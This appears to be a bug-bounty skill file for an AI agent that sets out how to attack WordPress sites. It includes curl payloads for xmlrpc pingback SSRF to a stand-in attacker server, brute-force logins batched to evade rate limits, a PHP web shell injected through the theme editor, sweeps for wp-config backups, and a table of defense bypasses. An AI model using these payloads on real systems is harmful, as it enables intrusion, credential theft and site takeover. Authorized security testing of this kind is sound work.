---
name: wordpress
description: WordPress attack surface: plugin CVEs, REST API user enum, xmlrpc, theme upload, AJAX action handlers, config backup exposure
depends_on: []
---

# WordPress

WordPress powers ~40% of the web. Bug bounty value concentrates in plugin/theme vulnerability chaining ($4.5K corpus max), REST API user enumeration, xmlrpc.php abuse, and admin-ajax handler exploitation. The plugin ecosystem is the primary attack surface -- plugins run with the same privileges as WordPress core.

## Plugin CVE Pipeline

The highest-paying WordPress pattern ($4.5K): systematically audit `wp_ajax_nopriv_*` AJAX actions.

1. **Enumerate installed plugins**: crawl `/wp-content/plugins/*/readme.txt` for `Stable tag:` version lines
2. **Cross-reference WPScan DB**: for each plugin+version, check wpscan.com/api and exploit-db for known CVEs
3. **Audit AJAX handlers**: for each plugin, grep source (or its public GitHub mirror) for `wp_ajax_nopriv_` and `wp_ajax_` registrations
4. **Trace data flow**: from each handler's callback function, follow user input to database queries -- look for un-prepared `$wpdb->query()` / `$wpdb->get_results()` calls that skip `$wpdb->prepare()`
5. **Check nonce enforcement**: many AJAX handlers register `wp_ajax_nopriv_*` (accessible without login) but forget to call `check_ajax_referer()` or `wp_verify_nonce()`

```bash
# Enumerate plugin AJAX actions from source
grep -rn "wp_ajax_nopriv_" /wp-content/plugins/ | grep "add_action"
# Trace to handler: the second arg is the callback function name
# Then grep that function for $wpdb-> calls without ->prepare()
```

## REST API Attack Surface

### User Enumeration
- `/wp-json/wp/v2/users` -- returns usernames, display names, avatar URLs (no auth required by default)
- `/?rest_route=/wp/v2/users` -- alternate route when pretty permalinks are off
- `/?author=1`, `/?author=2` -- author archive redirects leak usernames via URL slug

### REST Route Discovery
- `/wp-json/wp/v2/` -- lists all registered REST routes and their endpoints
- `/wp-json/` -- root discovery endpoint, reveals all namespaces (wp/v2, wc/v3, etc.)
- Custom plugin REST routes often lack permission callbacks -- enumerate all namespaces and test each route unauthenticated

### REST CORS Misconfiguration
- Send requests with `Origin: https://evil.com` to every `/wp-json/*` endpoint
- Check for `Access-Control-Allow-Origin: *` or reflection of arbitrary origins
- WordPress REST API CORS is configured per-site; many rely on plugin defaults that allow all origins

## xmlrpc.php Exploitation

Even when "pingbacks are disabled" in settings, `xmlrpc.php` may still accept calls. Three distinct layers:

1. **Post-level pingback toggle**: only controls pingback for individual posts
2. **`xmlrpc_enabled` filter**: can be disabled in code but many hosts leave it
3. **`xmlrpc.php` file existence**: physically present even if filters block some methods

```bash
# Check if xmlrpc.php responds
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Pingback SSRF: use xmlrpc to make the server fetch an arbitrary URL
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://ATTACKER_SERVER</string></value></param><param><value><string>https://target.com/any-post</string></value></param></params></methodCall>'

# Login brute force via wp.getUsersBlogs (one HTTP request per attempt)
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>'

# system.multicall: batch N login attempts in a single HTTP request
# Bypasses per-request rate limiting
```

## admin-ajax.php Handler Audit

The `wp-admin/admin-ajax.php` endpoint is a universal dispatcher. Every plugin that registers AJAX handlers creates attack surface here.

1. **Enumerate actions**: grep theme/plugin source for `add_action('wp_ajax_', ...)` and `add_action('wp_ajax_nopriv_', ...)`
2. **Test nopriv handlers**: `POST /wp-admin/admin-ajax.php` with `action=handler_name` -- nopriv handlers run without authentication
3. **Check privilege escalation**: some `wp_ajax_` handlers check `is_admin()` (which tests the URL path, not the user role) instead of `current_user_can('capability')`
4. **Input validation**: many handlers trust `$_POST`/`$_GET` without sanitization or nonce checks

## Configuration Backup Exposure

Sweep for backup files that leak database credentials and auth keys:

```
/wp-config.php.bak
/wp-config.old
/wp-config.php~
/wp-config.php.save
/wp-config.php.orig
/wp-config.php.txt
/wp-config.php.swp
/.wp-config.php.swp
/wp-config-sample.php  (may reveal expected structure)
```

Also check for full-site backups: `/backup.zip`, `/wp-content/backups/`, database dumps.

## Theme/Plugin Upload RCE

If an attacker gains editor-level access (or the theme editor is enabled for lower roles):
1. Navigate to Appearance > Theme Editor
2. Edit `functions.php` or `404.php` of the active theme
3. Inject PHP: `<?php system($_GET['cmd']); ?>`
4. Access via `https://target.com/wp-content/themes/theme-name/404.php?cmd=id`

## N-Day Disclosure Workflow

Maintain version fingerprints for every in-scope WordPress asset:
1. Subscribe to WPScan, Wordfence, Patchstack advisories
2. When a new plugin CVE drops, immediately fingerprint all in-scope WordPress sites for that plugin+version
3. Test the exploit before the patch propagates (auto-updates can take 12-72 hours)
4. Document the version match + successful exploitation, not just "outdated software detected"

## Probe Targets

```bash
# Core enumeration
curl -s https://target.com/wp-json/wp/v2/users
curl -s https://target.com/wp-json/wp/v2/
curl -s https://target.com/?rest_route=/wp/v2/users
curl -s https://target.com/xmlrpc.php -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Plugin version fingerprinting
for plugin in $(curl -s https://target.com/ | grep -oP '/wp-content/plugins/\K[^/]+' | sort -u); do
  curl -s "https://target.com/wp-content/plugins/$plugin/readme.txt" | head -20
done

# Author enumeration
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{redirect_url}\n" "https://target.com/?author=$i"
done

# Config backup sweep
for f in wp-config.php.bak wp-config.old wp-config.php~ wp-config.php.save wp-config.php.txt; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$f")
  echo "$f: $code"
done

# admin-ajax action test (replace ACTION_NAME with discovered actions)
curl -s -X POST https://target.com/wp-admin/admin-ajax.php -d "action=ACTION_NAME"

# CMS default info-disclosure endpoints (treat any 200 with content as a finding)
curl -s https://target.com/readme.html        # WP version
curl -s https://target.com/license.txt         # confirms WP
curl -s https://target.com/wp-includes/version.php  # version constant
```

## Defense-Bypass Pairs

| Defense | Bypass | Evidence |
|---------|--------|----------|
| REST API user enum disabled via plugin | `/?author=N` redirects still leak usernames | Author archive separate from REST |
| xmlrpc.php disabled via `.htaccess` | `/?rest_route=/wp/v2/users` still accessible | REST and xmlrpc are independent surfaces |
| Rate limiting on `wp-login.php` | xmlrpc `system.multicall` batches N attempts per request | Bypasses per-request limiters |
| WAF blocks `/wp-admin/` | `admin-ajax.php` is in `/wp-admin/` but many WAFs allow it for frontend AJAX | WAF rule gap |
| Plugin auto-update enabled | 12-72h window between advisory and propagation | N-day exploitation window |
| REST API disabled via `rest_authentication_errors` filter | Some plugins re-register REST routes after the filter | Plugin-specific bypass |

## Cross-References

`api_security`, `ssrf`, `information_disclosure`, `sql_injection`, `authentication_bypass`

## Validation Requirements

- Reproduce findings with at least one alternate principal where authz is involved
- Verify version disclosure aligns with the CVE list before claiming version-specific impact
- Distinguish "tech detected" from "tech vulnerable" -- many fingerprints just identify the stack
- For plugin SQLi: show extracted data, not just error-based confirmation
- For xmlrpc SSRF: demonstrate server-side request to attacker-controlled host
- For user enum: show that the leaked usernames are valid login identifiers
